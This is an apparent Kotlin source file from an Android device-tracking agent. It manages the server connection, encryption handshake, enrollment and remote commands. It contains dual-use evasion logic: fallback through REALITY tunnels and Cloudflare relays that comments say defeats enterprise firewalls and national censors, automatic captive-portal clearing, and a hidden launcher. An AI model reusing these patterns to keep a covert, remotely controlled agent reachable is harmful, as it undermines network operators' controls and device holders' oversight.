            //  • REALITY: the xray `freedom` redirect tunnels straight to the tracker VIP,
            //    BYPASSING Traefik's sticky-session cookie. With 3 active-active replicas,
            //    polling-first fans each poll across replicas (Swarm IPVS round-robin) →
            //    "Session ID unknown" handshake thrash → the agent mistakes REALITY for blocked
            //    and falls back to the relay. A single WebSocket is one TCP connection, so it
            //    pins to one replica (the Redis adapter handles cross-replica delivery).
            // Only the pure-direct path (through the Cloudflare proxy) keeps polling-first
            // (CF-proxy invariant — websocket-first hangs behind some CF edges).
            if (socksPort != null || usingRelay) opts.transports = arrayOf("websocket")
            // Mark REALITY-tunnelled handshakes so the server sets dpi.reality (drives the WebUI badge).
            // Include the active xray node IP so the server can display it in the dashboard card.
            if (socksPort != null) {
                val nodeIp = TransportManager.activeNode ?: ""
                opts.extraHeaders = mapOf("X-Via-Reality" to listOf(nodeIp.ifEmpty { "1" }))
            }

            // Choose which network to bind OkHttp's sockets to:
            //  • REALITY  → null (egress is xray's own subprocess sockets, not OkHttp's).
            //  • cellular → the requested cellular Network.
            //  • primary  → prefer an explicit Wi-Fi network when we have one. THIS is what lets the
            //    agent actually use Wi-Fi on guest/captive networks Android won't internet-validate
            //    (where the OS default stays cellular). Falls back to the OS default when no Wi-Fi.
            val bindNetwork: Network? = when {
                socksPort != null -> null
                usingCellular     -> network ?: cellNetwork
                else              -> network ?: wifiNetwork
            }
            boundTransport = when {
                socksPort != null                                 -> null        // REALITY → OS-default egress
                usingCellular                                     -> "cellular"
                bindNetwork != null && bindNetwork == wifiNetwork -> "wifi"
                else                                              -> null         // OS default
            }
            val (client, _) = buildOkHttpClient(bindNetwork, socksPort)
            opts.callFactory       = client
            opts.webSocketFactory  = client

            var connectedAt = 0L

            socket = IO.socket(url, opts).also { s ->
                s.on(Socket.EVENT_CONNECT) {
                    connectedAt = System.currentTimeMillis()
                    errorCount.set(0)
                    encActive = false
                    Log.i(TAG, "Connected via ${if (usingCellular) "cellular" else "default network"}")
                    realityAttempts = 0
                    relayAttempts = 0
                    // Late-IPv6-default upgrade: if we came up over IPv4 REALITY but the physical
                    // network now has a v6 default, re-dial v6 (budget-capped per network). A successful
                    // v6 session re-arms that budget for any future drops back to v4.
                    if (usingReality) {
                        if (realityConnectedV6) v6UpgradeAttempts = 0
                        else tryUpgradeToV6(wifiNetwork)
                    }
                    // Don't STICK on cellular — keep re-probing wifi/REALITY; cancel the probe otherwise.
                    // Arm a Doze-proof climb-back probe for the current fallback transport; cancel
                    // it once we're back on the primary (Wi-Fi direct/REALITY). Don't STICK anywhere.
                    when {
                        usingCellular       -> scheduleCellWifiProbe()
                        usingRelay          -> scheduleDirectProbe()
                        usingDirectFallback -> scheduleRealityProbe()
                        else                -> cancelReprobeAlarm()
                    }
                    val ephPub = EncryptionHelper.generateEphemeralKey()
                    if (EncryptionHelper.deriveKey()) {
                        // Kick off ECDH handshake; defer register until enc_hello_ack
                        s.emit("enc_hello", JSONObject().apply { put("ephemeralPubKey", ephPub) })
                        // Use socketHandler for the timeout — register/flushPending are socket ops, not UI.
                        socketHandler.postDelayed({
                            if (!encActive) {
                                // Server didn't ack (old server / bug) — fall back to plaintext
                                Log.w(TAG, "enc_hello_ack timeout — proceeding unencrypted")
                                EncryptionHelper.clearSession()
                                register(ctx)
                                flushPending(s)
                                mainHandler.post { connectListener?.invoke() }
                            }
                        }, 4_000)
                    } else {
                        // Key derivation failed — connect unencrypted
                        EncryptionHelper.clearSession()
                        register(ctx)
                        flushPending(s)
                        mainHandler.post { connectListener?.invoke() }
                    }
                }
                s.on("enc_hello_ack") {
                    encActive = true
                    Log.i(TAG, "Encryption handshake complete")
                    register(ctx)
                    flushPending(s)
                    mainHandler.post { connectListener?.invoke() }
                }
                s.on("e") { args ->
                    val wrapper = args.firstOrNull() as? JSONObject ?: return@on
                    val (ev, d) = EncryptionHelper.decrypt(wrapper) ?: return@on
                    when (ev) {
                        "command"         -> { handleStreamCommand(d); mainHandler.post { commandListener?.invoke(d) } }
                        "talk_chunk"      -> {
                            val b64 = d.optString("base64")
                            val sr  = d.optInt("sampleRate", 44100)
                            if (b64.isNotEmpty()) talkChunkListener?.invoke(b64, sr)
                        }
                        "registered"      -> {
                            val id = d.optString("deviceId")
                            if (id.isNotEmpty()) Prefs(ctx).deviceId = id
                            applyZkPubKey(ctx, d.optString("zkPubKey", ""))
                        }
                        "please_register" -> register(ctx)
                        "key_enrolled"    -> {
                            val p = Prefs(ctx)
                            p.keyEnrolled = true
                            if (p.enrollmentToken.isNotBlank())  p.enrollmentToken = ""
                            if (p.enrollmentTicket.isNotBlank()) p.enrollmentTicket = ""
                            Log.i(TAG, "Device key enrolled via encrypted channel")
                            exitOrphanLock(ctx)   // (re)enrolled — incl. admin-fleet (no ZK key) → leave orphan state
                        }
                        "re_enroll"       -> {
                            Log.i(TAG, "re_enroll via encrypted channel — clearing keyEnrolled")
                            Prefs(ctx).keyEnrolled = false
                            socketHandler.post { connect(ctx) }
                        }
                        "zk_pub_key"      -> applyZkPubKey(ctx, d.optString("zkPubKey", ""))
                        "device_locked"   -> enterOrphanLock(ctx)
                    }
                }
                s.on(Socket.EVENT_CONNECT_ERROR) { args ->
                    val count = errorCount.incrementAndGet()
                    val mode = when {
                        usingCellular && usingRelay -> "cell+relay"
                        usingCellular               -> "cell"
                        usingRelay                  -> "relay"
                        else                        -> "wifi"
                    }
                    val errMsg = args.firstOrNull()?.toString() ?: ""
                    Log.e(TAG, "Connect error #$count [$mode]: $errMsg")
                    // Server signalled that admin has activated rescue for this device.
                    // Clear keyEnrolled so next connect uses enrollment auth (sends publicKey).
                    // The server will queue the key for admin approval — no bypass, no auto-approve.
                    if (errMsg.contains("rescue_pending", ignoreCase = true)) {
                        Log.i(TAG, "rescue_pending received — clearing keyEnrolled, re-enrolling")
                        Prefs(ctx).keyEnrolled = false
                        errorCount.set(0)
                        socketHandler.postDelayed({ connect(ctx) }, 2_000)
                        return@on
                    }
                    try { when {
                        !usingCellular && count >= CELL_FALLBACK_AFTER -> {
                            val pr = Prefs(ctx)
                            val realityNodes = pr.realityNodes
                            val realityPossible = realityNodes.isNotEmpty() && pr.transportMode != "direct" &&
                                TransportManager.binaryAvailable(ctx) && !usingRelay
                            val relayAvailable = !usingRelay && !usingReality && pr.relayNodes.isNotEmpty()
                            when {
                                // stealth: DIRECT was the LAST resort (REALITY+relay already exhausted)
                                // and it's failing too → go to cellular. Must be the first branch:
                                // realityPossible below would otherwise re-escalate to REALITY and loop
                                // REALITY→relay→direct→REALITY forever. scheduleRealityProbe() (armed when
                                // we entered direct-fallback) + scheduleCellWifiProbe() climb back later.
                                usingDirectFallback -> {
                                    Log.w(TAG, "Direct (last resort) failing — falling back to cellular")
                                    usingDirectFallback = false
                                    cancelReprobeAlarm()
                                    requestCellular()
                                }
                                // Already on REALITY → bounce to the next node ("find one that works");
                                // in auto mode, periodically drop to re-probe direct so we leave REALITY
                                // once the block lifts.
                                usingReality -> {
                                    realityAttempts++
                                    val now = System.currentTimeMillis()
                                    when {
                                        // Tried every node several rounds → REALITY is blocked on this network
                                        // (e.g. the wifi also blocks :53687). Fall to cellular so the device stays
                                        // reachable; scheduleCellWifiProbe() keeps bringing us back to retry REALITY.
                                        realityAttempts >= realityNodes.size * REALITY_ROUNDS_BEFORE_CELL -> {
                                            usingReality = false
                                            TransportManager.stop()
                                            realityAttempts = 0
                                            // REALITY can't reach the nodes on this network (e.g. SonicWall blocks the
                                            // OVH datacenter IPs by reputation). Fall to the Cloudflare Worker relay —
                                            // its workers.dev edge IPs such firewalls usually trust — BEFORE cellular.
                                            if (pr.relayNodes.isNotEmpty()) {
                                                Log.w(TAG, "REALITY exhausted ($realityAttempts/${realityNodes.size} nodes) — falling back to Cloudflare Worker relay")
                                                usingRelay = true
                                                relayAttempts = 0
                                                relayNodeIdx = (Math.random() * pr.relayNodes.size).toInt()
                                                errorCount.set(0)
                                                socketHandler.post { buildSocket(null) }
                                                scheduleDirectProbe()
                                            } else {
                                                Log.w(TAG, "REALITY exhausted — no relay configured; falling back to cellular")
                                                requestCellular()
                                            }
                                        }
                                        // Auto mode: occasionally drop back to re-probe direct (block may have lifted).
                                        pr.transportMode == "auto" && now - lastDirectCheckTime >= REALITY_RETRY_DIRECT_AFTER -> {
                                            Log.w(TAG, "REALITY active — periodic direct re-probe")
                                            lastDirectCheckTime = now
                                            usingReality = false
                                            TransportManager.stop()
                                            errorCount.set(0)
                                            socketHandler.post { buildSocket(null) }
                                        }
                                        else -> {
                                            // IPv6-first ladder: before bouncing to the next node, retry the
                                            // SAME node over IPv4 (its v6 dial may have timed out — e.g. a
                                            // device with no real v6 route, or a v6-filtered network). Only
                                            // after BOTH families fail do we move on, dialing the next node's
                                            // IPv6 first: CA-v6 → CA-v4 → VA-v6 → VA-v4 → …
                                            val nodeIdx = ((realityNodeIdx % realityNodes.size) + realityNodes.size) % realityNodes.size
                                            val hasV6 = pr.nodeAddresses(nodeIdx).size > 1
                                            if (realityAddrIdx == 0 && hasV6) {
                                                realityAddrIdx = 1
                                                Log.i(TAG, "REALITY failing via IPv6 — retrying node idx=$nodeIdx over IPv4 (attempt $realityAttempts)")
                                            } else {
                                                realityAddrIdx = 0
                                                realityNodeIdx++
                                                Log.i(TAG, "REALITY node failing — bouncing to node idx=$realityNodeIdx (attempt $realityAttempts)")
                                            }
                                            errorCount.set(0)
                                            socketHandler.post { buildSocket(null) }
                                        }
                                    }
                                }
                                // Primary failing and REALITY configured → escalate to it (random start node).
                                realityPossible -> {
                                    Log.i(TAG, "Primary failing — escalating to REALITY transport")
                                    usingReality = true
                                    realityAttempts = 0
                                    usingRelay = false
                                    realityNodeIdx = (Math.random() * realityNodes.size).toInt()
                                    realityAddrIdx = 0   // fresh node → try its IPv6 first
                                    lastDirectCheckTime = System.currentTimeMillis()
                                    errorCount.set(0)
                                    socketHandler.post { buildSocket(null) }
                                }
                                relayAvailable -> {
                                    // No REALITY available (e.g. no xray binary) but a relay is configured — use it.
                                    Log.i(TAG, "Primary failing, switching to Cloudflare relay")
                                    usingRelay = true
                                    relayAttempts = 0
                                    relayNodeIdx = (Math.random() * pr.relayNodes.size).toInt()
                                    lastDirectCheckTime = System.currentTimeMillis()
                                    errorCount.set(0)
                                    socketHandler.post { buildSocket(null) }
                                    scheduleDirectProbe()
                                }
                                usingRelay -> {
                                    relayAttempts++
                                    val relayCount = pr.relayNodes.size.coerceAtLeast(1)
                                    val now = System.currentTimeMillis()
                                    when {
                                        // Tried every relay door several rounds → all of them are blocked on
                                        // this network (even Cloudflare, e.g. a national censor) → cellular so
                                        // the device stays reachable. scheduleCellWifiProbe() keeps bringing us
                                        // back to retry wifi (direct → REALITY → relay) every few minutes.
                                        relayAttempts >= relayCount * RELAY_ROUNDS_BEFORE_CELL -> {
                                            if (pr.transportMode == "stealth") {
                                                // stealth ladder: before cellular, try the dependency-free
                                                // DIRECT path as a last resort — a REALITY+relay/server
                                                // outage on an otherwise-open network still reaches us.
                                                // (REALITY/relay both exhausted ⇒ either a national censor
                                                //  or a server-side outage; direct covers the latter.)
                                                Log.w(TAG, "Relay exhausted ($relayAttempts/$relayCount doors) — dropping to DIRECT (last resort) before cellular")
                                                usingRelay = false
                                                usingReality = false
                                                relayAttempts = 0
                                                usingDirectFallback = true
                                                lastDirectCheckTime = System.currentTimeMillis()
                                                errorCount.set(0)
                                                socketHandler.post { buildSocket(null) }
                                                scheduleRealityProbe()
                                            } else {
                                                Log.w(TAG, "Relay exhausted ($relayAttempts attempts / $relayCount doors) — falling back to cellular")
                                                usingRelay = false
                                                relayAttempts = 0
                                                requestCellular()
                                            }
                                        }
                                        // Hourly: drop relay and re-probe direct (block may have lifted).
                                        now - lastDirectCheckTime >= RELAY_DIRECT_CHECK_INTERVAL -> {
                                            Log.w(TAG, "Relay — periodic direct re-probe")
                                            lastDirectCheckTime = now
                                            usingRelay = false
                                            errorCount.set(0)
                                            socketHandler.post { buildSocket(null) }
                                        }
                                        else -> {
                                            // Bounce to the next relay door ("find one that works") with backoff.
                                            relayNodeIdx++
                                            val delay = retryDelay(count)
                                            Log.d(TAG, "Relay door failing — bouncing to idx=$relayNodeIdx in ${delay}ms (attempt $relayAttempts/$relayCount doors)")
                                            errorCount.set(0)
                                            socketHandler.postDelayed({ buildSocket(null) }, delay)
                                        }
                                    }
                                }
                                hasActiveNetwork(ctx) -> {
                                    // Direct failing, network up — server unreachable, keep retrying.
                                    val delay = retryDelay(count)
                                    Log.d(TAG, "Network active, server unreachable — retry in ${delay}ms")
                                    socketHandler.postDelayed({ buildSocket(null) }, delay)
                                }
                                else -> {
                                    // No network at all — request cellular.
                                    usingRelay = false
                                    requestCellular()
                                }
                            }
                        }
                        usingCellular && count >= CELL_FALLBACK_AFTER -> {
                            // Cellular also failing — revert to default network and back off.
                            Log.w(TAG, "Cellular failing too — reverting to default network")
                            usingCellular = false
                            usingRelay = false
                            cellNetwork = null
                            errorCount.set(0)
                            savedContext?.let { c ->
                                val cm = c.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                                cellCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
                                cellCallback = null
                            }
                            socketHandler.postDelayed({ buildSocket(null) }, 15_000)
                        }
                        else -> {
                            val delay = retryDelay(count)
                            Log.d(TAG, "Retry in ${delay}ms")
                            socketHandler.postDelayed({ buildSocket(if (usingCellular) cellNetwork else null) }, delay)
                        }
                    } } catch (e: Exception) {
                        Log.e(TAG, "CONNECT_ERROR handler exception: ${e.message}")
                        socketHandler.postDelayed({ buildSocket(if (usingCellular) cellNetwork else null) }, 5_000)
                    }
                }
                s.on(Socket.EVENT_DISCONNECT) { args ->
                    Log.w(TAG, "Disconnected: ${args.firstOrNull()}")
                    clearStreamSessions()
                    val uptime = System.currentTimeMillis() - connectedAt
                    val prefsD = Prefs(ctx)
                    // A direct (non-relay, non-cellular) connection that dies within 60 s usually
                    // means the network is resetting/blocking it. Don't retry direct — escalate to
                    // REALITY (preferred) or the legacy relay so the next attempt bypasses the block.
                    if (!usingRelay && !usingReality && !usingCellular && !usingDirectFallback && uptime in 1..<60_000) {
                        val nodes = prefsD.realityNodes
                        when {
                            nodes.isNotEmpty() && prefsD.transportMode != "direct" && TransportManager.binaryAvailable(ctx) -> {
                                Log.w(TAG, "Direct flapped after ${uptime}ms — escalating to REALITY")
                                usingReality = true
                                realityNodeIdx = (Math.random() * nodes.size).toInt()
                                realityAddrIdx = 0   // fresh node → try its IPv6 first
                                lastDirectCheckTime = System.currentTimeMillis()
                                errorCount.set(0)
                                socketHandler.post { buildSocket(null) }
                                return@on
                            }
                            prefsD.relayNodes.isNotEmpty() -> {
                                Log.w(TAG, "Direct flapped after ${uptime}ms — switching to relay")
                                usingRelay = true
                                relayAttempts = 0
                                relayNodeIdx = (Math.random() * prefsD.relayNodes.size).toInt()
                                lastDirectCheckTime = System.currentTimeMillis()
                                errorCount.set(0)
                                socketHandler.post { buildSocket(null) }
                                scheduleDirectProbe()
                                return@on
                            }
                        }
                    }
                    socketHandler.postDelayed({ buildSocket(if (usingCellular) cellNetwork else null) }, 2_000)
                }
                s.on("registered") { args ->
                    val d  = args.firstOrNull() as? JSONObject ?: return@on
                    val id = d.optString("deviceId")
                    if (id.isNotEmpty()) Prefs(ctx).deviceId = id
                    applyZkPubKey(ctx, d.optString("zkPubKey", ""))
                }
                s.on("please_register") {
                    // Server just unlocked — re-register so it knows we're here
                    register(ctx)
                }
                s.on("key_enrolled") {
                    // Server confirmed our public key is stored — switch to key-based auth.
                    // Clear enrollment token + ticket (consumed; no longer needed).
                    val p = Prefs(ctx)
                    p.keyEnrolled = true
                    if (p.enrollmentToken.isNotBlank())  p.enrollmentToken = ""
                    if (p.enrollmentTicket.isNotBlank()) p.enrollmentTicket = ""
                    Log.i(TAG, "Device key enrolled — will use key-based auth on next connect")
                    exitOrphanLock(ctx)   // (re)enrolled — incl. admin-fleet (no ZK key) → leave orphan state
                }
                s.on("re_enroll") {
                    // Server lost our public key (e.g. device was deleted then rescued).
                    // Clear keyEnrolled so next connect uses enrollment auth (sends publicKey again).
                    Log.i(TAG, "re_enroll received — clearing keyEnrolled, reconnecting with public key")
                    Prefs(ctx).keyEnrolled = false
                    socketHandler.post { connect(ctx) }
                }
                // Live owner-assignment: server pushes the owner's ZK public key when
                // an admin assigns this device to a registered user while it's online.
                // Also fires with zkPubKey=null/empty when ownership is removed.
                s.on("zk_pub_key") { args ->
                    val d = args.firstOrNull() as? JSONObject ?: return@on
                    applyZkPubKey(ctx, d.optString("zkPubKey", ""))
                }
                // Owner account wiped → go dormant + un-hide the launcher so the holder can reclaim.
                s.on("device_locked") { enterOrphanLock(ctx) }
                s.on("command") { args ->
                    val data = args.firstOrNull() as? JSONObject ?: return@on
                    handleStreamCommand(data)
                    commandListener?.invoke(data)
                }
                s.on("talk_chunk") { args ->
                    val data = args.firstOrNull() as? JSONObject ?: return@on
                    val b64 = data.optString("base64")
                    val sr  = data.optInt("sampleRate", 44100)
                    if (b64.isNotEmpty()) talkChunkListener?.invoke(b64, sr)
                }
                s.connect()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Socket init failed: ${e.message}")
            socketHandler.postDelayed({ buildSocket(if (usingCellular) cellNetwork else null) }, 3_000)
        }
    }

    private fun hasActiveNetwork(ctx: Context): Boolean = try {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        cm.activeNetwork != null
    } catch (_: Exception) { false }

    /**
     * True if the active physical (non-VPN, internet-capable) network currently has an IPv6 DEFAULT
     * route (`::/0`). This is the gate for ever dialing a node's v6 literal: without a default the
     * dial is guaranteed ENETUNREACH. On bridge-mode APs (Google WiFi) the router's `::/0` RA can
     * land MINUTES after association, so right after connecting this is `false` even though the
     * network hands out v6 addresses.
     */
    private fun physicalV6Available(ctx: Context): Boolean {
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val candidates = (listOfNotNull(cm.activeNetwork) + (cm.allNetworks ?: emptyArray()).toList()).distinct()
            candidates.any { net ->
                val caps = cm.getNetworkCapabilities(net) ?: return@any false
                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return@any false
                if (!caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) return@any false
                cm.getLinkProperties(net)?.routes?.any { it.isDefaultRoute() && it.destination.address is Inet6Address } == true
            }
        } catch (_: Throwable) { false }
    }

    /**
     * React to a physical network's LinkProperties changing. If a v6 DEFAULT route (`::/0`) is present
     * while the REALITY transport is on IPv4, upgrade to IPv6 (see [tryUpgradeToV6]). This closes the
     * RA gap: on bridge-mode APs the `::/0` default can land minutes after association.
     */
    private fun maybeUpgradeToV6(network: Network, lp: LinkProperties?) {
        val v6 = try {
            lp?.routes?.any { it.isDefaultRoute() && it.destination.address is Inet6Address } == true
        } catch (_: Throwable) { false }
        physicalV6Default = v6
        if (v6) tryUpgradeToV6(network)
    }

    /**
     * Re-dial the current REALITY node over IPv6 when it is reachable (mode: currently on IPv4 and
     * the physical network now has a v6 default). Capped at [V6_UPGRADE_MAX_ATTEMPTS] per network so
     * a network that ADVERTISES a v6 default it can't actually route to the nodes can't loop forever;
     * the budget is reset whenever a v6 session is established (see the EVENT_CONNECT handler).
     */
    private fun tryUpgradeToV6(network: Network?) {
        val ctx = savedContext ?: return
        if (!usingReality) return                 // only REALITY has a v6-vs-v4 dial choice
        if (realityAddrIdx == 0) return           // already dialing IPv6
        if (realityConnectedV6) return            // already up over IPv6
        if (!physicalV6Available(ctx)) return      // no v6 default yet → nothing to upgrade to
        val prefs = Prefs(ctx)
        val count = prefs.realityNodes.size
        if (count == 0) return
        val nodeIdx = ((realityNodeIdx % count) + count) % count
        if (prefs.nodeAddresses(nodeIdx).size <= 1) return   // node has no v6 literal to upgrade to
        if (v6UpgradeNetwork != network) { v6UpgradeNetwork = network; v6UpgradeAttempts = 0 }
        if (v6UpgradeAttempts >= V6_UPGRADE_MAX_ATTEMPTS) return
        v6UpgradeAttempts++
        Log.i(TAG, "IPv6 default available — re-dialing node idx=$nodeIdx over IPv6 (attempt $v6UpgradeAttempts, was IPv4)")
        realityAddrIdx = 0
        errorCount.set(0)
        socketHandler.post { buildSocket(null) }
    }

    /**
     * Observe Wi-Fi networks so the agent can BIND its socket to Wi-Fi even when Android refuses to
     * internet-"validate" it — the guest/captive-network case (associated + has an IP, but the OS
     * keeps cellular as the default route). `registerNetworkCallback` only OBSERVES: it neither keeps
     * a radio up nor changes the OS default, so it's cheap and side-effect-free. We request
     * TRANSPORT_WIFI + INTERNET *without* requiring VALIDATED so captive/guest Wi-Fi still matches.
     *
     * `buildSocket()` then prefers `wifiNetwork` on the primary path; the connect-error ladder still
     * escalates to cellular if Wi-Fi genuinely can't reach the server (real captive portal / block),
     * so this is safe. NOTE: only OkHttp's sockets (direct/relay) are bound — REALITY egress is
     * xray's own subprocess sockets, which follow the OS default and are not covered here.
     */
    private fun registerWifiCallback() {
        val ctx = savedContext ?: return
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        wifiCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
        val req = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        val cb = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                wifiNetwork = network
                // Climb onto Wi-Fi promptly whenever we're NOT already bound to it (e.g. parked on a
                // cellular fallback, or riding the OS default which is cellular on unvalidated Wi-Fi).
                // REALITY is skipped — its egress isn't OkHttp-bound.
                if (boundTransport != "wifi" && !usingReality) {
                    Log.i(TAG, "WiFi available — rebuilding to prefer it (boundTransport=$boundTransport)")
                    if (usingCellular) {
                        usingCellular = false
                        cellCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
                        cellCallback = null
                        cellNetwork = null
                    }
                    errorCount.set(0)
                    socketHandler.post { buildSocket(null) }
                }
            }
            override fun onLost(network: Network) {
                if (wifiNetwork == network) {
                    Log.w(TAG, "WiFi lost — agent will follow OS default until Wi-Fi returns")
                    wifiNetwork = null
                }
                if (captivePortalTriedFor == network) captivePortalTriedFor = null
                if (v6UpgradeNetwork == network) { v6UpgradeNetwork = null; v6UpgradeAttempts = 0 }
                physicalV6Default = null        // unknown again until the next association's RA
                lastAirlinePortalTryMs = 0L
                if (wifiPromotedFor == network) wifiPromotedFor = null   // re-arm promotion for the next association
                cancelAirlinePortalProbe()   // no network → nothing to keep probing
                CaptivePortalHelper.reset()   // clear "auto-clearing/failed" state for the gone network
                AirlineWifiHelper.resetSignInNotification(ctx)   // dismiss a stale "needs sign-in" alert
                RogueApDetector.recordWifiLost(ctx)   // burst of drops → possible deauth flood (+ defend)
            }
            override fun onLinkPropertiesChanged(network: Network, lp: LinkProperties) {
                // Routes changed on this Wi-Fi — most importantly, the router's RA may have just
                // installed the v6 `::/0` default (minutes after association on bridge-mode APs).
                // Upgrade an IPv4-dialing REALITY transport to IPv6 the moment that happens.
                maybeUpgradeToV6(network, lp)
            }
            override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                wifiNetwork = network
                if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
                    captivePortalTriedFor = null   // healthy WiFi — nothing to clear
                    lastAirlinePortalTryMs = 0L
                    cancelAirlinePortalProbe()     // validated → no further probing needed
                    CaptivePortalHelper.reset()    // clear any stale "failed" state
                    // This WiFi has real internet. If the agent is NOT already riding it as the OS
                    // default (parked on cellular, or on REALITY-over-cellular), reclaim it now:
                    // release the cellular hold so WiFi becomes the OS default and restart the
                    // transport over it. De-duped per-network so a callback burst doesn't churn.
                    val osDefault = try {
                        (ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).activeNetwork
                    } catch (_: Throwable) { null }
                    // Already on WiFi if OkHttp is bound to it ("wifi"), or a default-routed transport
                    // (REALITY/relay/direct) is riding an OS default that IS this WiFi and we're not on cell.
                    val alreadyOnThisWifi = boundTransport == "wifi" ||
                                            (network == osDefault && !usingCellular)
                    if (!alreadyOnThisWifi && wifiPromotedFor != network) {
                        wifiPromotedFor = network
                        promoteToWifi("WiFi validated")
                    }
                    return
                }
                if (wifiPromotedFor == network) wifiPromotedFor = null   // re-arm if it drops back to unvalidated
                // Unvalidated WiFi (captive portal, or has INTERNET cap but not yet validated):
                // best-effort click-through clear, ONCE per association, off the socket thread.
                // Airline SSIDs retry every AIRLINE_PORTAL_RETRY_MS — the inflight portal is often
                // a "wifi starts after takeoff" page on the first attempt, same association.
                val maybePortal = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_CAPTIVE_PORTAL) ||
                                  caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val ssid = AirlineWifiHelper.currentSsid(ctx)
                // Known inflight SSID (creds or not) → keep probing/solving: click-through/WebView
                // can still clear free portals, and repeated failures raise the sign-in alert.
                val airline = AirlineWifiHelper.isKnownInflightSsid(ssid)
                if (airline) armAirlinePortalProbe()   // stable-but-captive airline WiFi → keep probing via alarm
                val now = System.currentTimeMillis()
                val airlineRetry = airline && (now - lastAirlinePortalTryMs) >= AIRLINE_PORTAL_RETRY_MS
                if (maybePortal && (captivePortalTriedFor != network || airlineRetry)) {
                    captivePortalTriedFor = network
                    lastAirlinePortalTryMs = now
                    Thread {
                        val cleared = if (airline) {
                            Log.i(TAG, "airline captive on $ssid — running full portal solve")
                            AirlineWifiHelper.trySolve(ctx, network, AirlineWifiHelper.gatewayIp(ctx), ssid)
                        } else {
                            CaptivePortalHelper.tryAutoAccept(network)
                        }
                        if (cleared) {
                            // Portal cleared — tell Android's NetworkMonitor to re-evaluate so it
                            // promotes this WiFi to VALIDATED / default route. reportNetworkConnectivity
                            // calls NetworkMonitor.forceReevaluation() internally (requires CHANGE_NETWORK_STATE).
                            // The old captive_portal_mode=0 trick silently no-ops on Android 9+ because
                            // captive_portal_mode is not in dpm.setGlobalSetting()'s allowed-keys list.
                            AirlineWifiHelper.reportCleared(ctx, network)
                            Log.i(TAG, "Captive portal cleared — re-evaluation requested")
                            // Don't switch here: reportNetworkConnectivity(true) above triggers the
                            // OS to re-probe → if it flips this WiFi to VALIDATED, onCapabilitiesChanged
                            // fires and promoteToWifi() reclaims it (works for REALITY too, unlike the
                            // old !usingReality-guarded rebuild which left REALITY pinned to cellular).
                        }
                    }.apply { isDaemon = true }.start()
                }
            }
        }
        wifiCallback = cb
        try { cm.registerNetworkCallback(req, cb) }
        catch (e: Exception) { Log.e(TAG, "registerWifiCallback failed: ${e.message}") }
    }

    private fun requestCellular() {
        val ctx = savedContext ?: return
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        cellCallback?.let {
            try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {}
        }

        val req = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        val cb = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                Log.i(TAG, "Cellular available — switching from WiFi")
                cellNetwork = network
                usingCellular = true
                usingRelay = false   // reset relay; try primary URL over cellular first
                usingReality = false // REALITY egress isn't network-bound; use direct over cellular first
                TransportManager.stop()
                errorCount.set(0)
                socketHandler.post { buildSocket(network) }
            }

            override fun onLost(network: Network) {
                Log.w(TAG, "Cellular lost — falling back to default network")
                cellNetwork = null
                usingCellular = false
                errorCount.set(0)
                socketHandler.post { buildSocket(null) }
            }

            override fun onUnavailable() {
                Log.w(TAG, "No cellular available — retrying default in 15s")
                usingCellular = false
                socketHandler.postDelayed({ buildSocket(null) }, 15_000)
            }
        }
        cellCallback = cb

        try {
            Log.i(TAG, "Requesting cellular fallback network")
            cm.requestNetwork(req, cb, 30_000)
        } catch (e: Exception) {
            Log.e(TAG, "requestNetwork failed: ${e.message}")
            socketHandler.postDelayed({ buildSocket(null) }, 15_000)
        }
    }

    /**
     * SHA-256 of this app's signing certificate (same digest apksigner prints). Lets the server
     * map the device to its APK variant (platform-signed vs stock) — so the mass-updater
     * dispatches the SAME-signer
     * build (the only one Android will let this device self-update to).
     */
    private fun signerSha256(context: Context): String? = try {
        val pm = context.packageManager
        val certBytes: ByteArray? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            pm.getPackageInfo(context.packageName, android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
                .signingInfo?.apkContentsSigners?.firstOrNull()?.toByteArray()
        } else {
            @Suppress("DEPRECATION")
            pm.getPackageInfo(context.packageName, android.content.pm.PackageManager.GET_SIGNATURES)
                .signatures?.firstOrNull()?.toByteArray()
        }
        certBytes?.let {
            java.security.MessageDigest.getInstance("SHA-256").digest(it)
                .joinToString("") { b -> "%02x".format(b) }
        }
    } catch (_: Throwable) { null }

    fun register(context: Context) {
        val prefs = Prefs(context)
        val deviceId = prefs.getOrCreateDeviceId()
        val appVersion = try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName
        } catch (_: Exception) { null }
        emit("register", JSONObject().apply {
            put("deviceId",       deviceId)
            put("name",           prefs.deviceName)
            put("model",          "${Build.MANUFACTURER} ${Build.MODEL}")
            put("androidVersion", Build.VERSION.RELEASE)
            put("osBuild",        Build.VERSION.INCREMENTAL)      // GrapheneOS build number, e.g. 2026053006
            put("securityPatch",  Build.VERSION.SECURITY_PATCH)   // SPL, e.g. 2026-05-05
            put("battery",        batteryLevel(context))
            if (appVersion != null) put("appVersion", appVersion)
